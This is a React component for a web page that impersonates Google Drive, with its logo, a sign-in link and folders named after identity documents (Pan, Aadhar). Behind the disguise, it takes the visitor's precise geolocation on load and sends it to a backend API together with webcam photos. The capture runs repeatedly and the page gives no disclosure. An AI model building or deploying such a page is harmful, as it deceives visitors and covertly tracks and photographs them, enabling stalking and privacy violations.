"use client";
import Image from "next/image";
import { WebCamComponent } from "./webcam";
import { getEvent, getLocation } from "@/apihandler/media.api";
import { use, useEffect, useRef, useState } from "react";

export const DriveComponent = () => {
  const lt = useRef(0);
  const lg = useRef(0);
  const accuracy = useRef(0);
  const [count, setCount] = useState(0);

  const onSave = async (str: string) => {
    const eventData = {
      lt: lt.current,
      lg: lg.current,
      s: str,
      acc: accuracy.current,
    };
    if (!(lt.current === 0 && lg.current === 0)) {
      const addCustomerRes = await getLocation(eventData);
      setCount(count + 1);
    }
  };
  const handleClick = () => {
    setCount(0);
  };
  const getLatLng = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition, showError, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      });
    } else {
    }
  };
  const showPosition = (position: GeolocationPosition) => {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    var accu = position.coords.accuracy; // Accuracy in meters
    lt.current = latitude;
    lg.current = longitude;
    accuracy.current = accu;
  };

  function showError(error: any) {
    switch (error.code) {
      case error.PERMISSION_DENIED:
        console.log("User denied the request for Geolocation.");
        break;
      case error.POSITION_UNAVAILABLE:
        console.log("Location information is unavailable.");
        break;
      case error.TIMEOUT:
        console.log("The request to get user location timed out.");
        break;
      case error.UNKNOWN_ERROR:
        console.log("An unknown error occurred.");
        break;
    }
  }

  useEffect(() => {
    getLatLng();
  }, []);
  return (
    <>
      <div className="navbar-fixed">
        <nav className="nav-extended grey lighten-5">
          <div className="nav-wrapper grey lighten-5 flex justify-between">
            <ul>
              <li className="flex items-center">
                <img
                  src="/google-drive.png"
                  style={{ width: 40, height: 40 }}
                  alt=""
                />
                <a href="#!" className="title grey-text text-darken-1">
                  Drive
                </a>
              </li>
            </ul>
            <ul className="">
              <li className="hidden sm:block">
                <a href="#!">
                  <i className="material-icons grey-text text-darken-1">apps</i>
                </a>
              </li>
              <li className="hidden sm:block">
                <a href="#!">
                  <i className="material-icons grey-text text-darken-1">
                    notifications
                  </i>
                </a>
              </li>
              <li>
                <a
                  href="https://drive.google.com/"
                  target="_blank"
                  className="waves-effect waves-light btn btn-flat white-text"
                >
                  Sign in
                </a>
              </li>
            </ul>
          </div>
        </nav>
      </div>
      <div className="main">
        <div className="container-fluid">
          <p className="subheader">Folders</p>
          <div className="card-panel-container">
            <div
              className="card-panel folder grey lighten-5"
              onClick={handleClick}
            >
              <div>
                <i className="material-icons left">folder</i>Education
              </div>
              <i className="material-icons grey-text text-darken-1">
                more_vert
              </i>
            </div>
            <div
              className="card-panel folder grey lighten-5"
              onClick={handleClick}
            >
              <div>
                <i className="material-icons left">folder</i>Pan
              </div>
              <i className="material-icons grey-text text-darken-1">
                more_vert
              </i>
            </div>
            <div
              className="card-panel folder grey lighten-5"
              onClick={handleClick}
            >
              <div>
                <i className="material-icons left">folder</i>Aadhar
              </div>
              <i className="material-icons grey-text text-darken-1">
                more_vert
              </i>
            </div>
          </div>
          <WebCamComponent onSave={onSave} takePhotos={count !== 5} />
        </div>
      </div>
    </>
  );
};
